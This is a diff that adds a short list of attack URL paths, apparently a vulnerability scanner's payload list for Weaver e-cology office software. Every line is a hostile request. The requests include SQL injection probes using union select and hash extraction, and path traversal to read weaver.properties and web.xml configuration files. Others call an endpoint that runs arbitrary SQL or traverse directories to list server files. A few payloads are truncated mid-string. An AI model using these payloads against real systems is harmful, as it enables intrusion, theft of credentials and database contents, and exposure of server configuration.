@@ -1,0 +1,12 @@
+/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
+/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id
+/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_%2f%2e%2e%2fweaver%2eproperties
+/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
+/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/web.xml
+/mobile/plugin/CheckServer.jsp?type=mobileSetting
+/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes(
+/Api/portal/elementEcodeAddon/getSqlData?sql=
+/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(
+/mysql_config.ini
+/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
+/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
